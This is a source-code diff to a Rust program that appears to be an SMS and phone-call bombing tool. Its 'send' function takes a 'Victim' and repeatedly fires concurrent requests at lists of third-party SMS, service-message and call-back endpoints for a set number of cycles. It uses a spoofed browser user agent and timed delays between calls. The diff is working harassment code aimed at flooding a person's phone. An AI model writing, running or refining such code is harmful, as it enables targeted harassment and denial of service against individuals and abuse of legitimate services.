@@ -1,58 +1,61 @@
 use crate::services::{
-    construct_call_services_list, construct_services_list, BodyType, Service, ServiceType, Victim,
+    construct_call_services_list, construct_services_list, BodyType, Service, Victim,
 };
+use futures::future::join_all;
 use reqwest::{Client, Method};
 use std::time::Duration;
 
-const CALL_DELAY: u8 = 15;
+const SERVICES_DELAY: u64 = 15;
+const CALL_SERVICES_DELAY: u64 = 30;
 
-/// Вы бы знали как мне стыдно за такой колхозинг, но надеюсь это на время
-pub async fn send(victim: Victim) -> Result<(), Box<dyn std::error::Error>> {
-    let mut s = Vec::new();
+pub async fn send(victim: Victim, cycles: u64) {
+    let mut workers = Vec::new();
 
-    let services = construct_services_list(victim.clone());
-    for service in services {
-        let t = tokio::spawn(async move {
-            send_single(service).await.expect("");
-        });
-        s.push(t);
-    }
+    let victim_clone = victim.clone();
+    workers.push(tokio::spawn(async move {
+        for i in 0..cycles {
+            let services = construct_services_list(victim_clone.clone()).await;
+            let services_futures: Vec<_> = services
+                .into_iter()
+                .map(|item| tokio::spawn(send_single(item)))
+                .collect();
 
-    let services = construct_call_services_list(victim);
-    let t = tokio::spawn(async move {
-        for service in services {
-            for i in 0..CALL_DELAY {
-                println!("Waiting {} seconds before calling", CALL_DELAY - i);
-
-                tokio::time::sleep(Duration::from_secs(1)).await;
+            join_all(services_futures).await;
+            if i < cycles - 1 {
+                tokio::time::sleep(Duration::from_secs(SERVICES_DELAY)).await;
             }
-            println!();
-
-            send_single(service.clone()).await.expect("");
         }
-    });
-    s.push(t);
+    }));
 
-    for i in s {
-        i.await?;
-    }
+    workers.push(tokio::spawn(async move {
+        for i in 0..cycles {
+            let call_services = construct_call_services_list(victim.clone()).await;
+            let call_services_futures: Vec<_> = call_services
+                .into_iter()
+                .map(|item| async move {
+                    send_single(item).await;
+                    tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
+                })
+                .collect();
 
-    Ok(())
+            for call_services_handle in call_services_futures {
+                call_services_handle.await;
+            }
+            if i < cycles - 1 {
+                tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
+            }
+        }
+    }));
+
+    join_all(workers).await;
 }
 
-async fn send_single(service: Service) -> Result<(), Box<dyn std::error::Error>> {
+async fn send_single(service: Service) {
     let client = Client::builder()
         .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0")
-        .cookie_store(true)
         .default_headers(service.headers)
         .build()
         .expect("");
-
-    match service.service_type {
-        ServiceType::Sms => println!("Sending SMS {}", service.name),
-        ServiceType::Call => println!("Calling {}", service.name),
-        ServiceType::ServiceMessage => println!("Sending service SMS {}", service.name),
-    }
 
     let mut res;
     match service.method {
@@ -65,9 +68,12 @@ async fn send_single(service: Service) -> Result<(), Box<dyn std::error::Error>>
         BodyType::Form => res = res.form(&service.body),
     }
 
-    let res = res.send().await?;
-    println!("{}: {}", res.status(), res.text().await?);
-    println!("{} sent\n", service.name);
-
-    Ok(())
+    println!("Starting {}", service.name);
+    let res = res.send().await.expect("");
+    println!(
+        "{} {}\n{}\n",
+        service.name,
+        res.status(),
+        res.text().await.unwrap()
+    );
 }
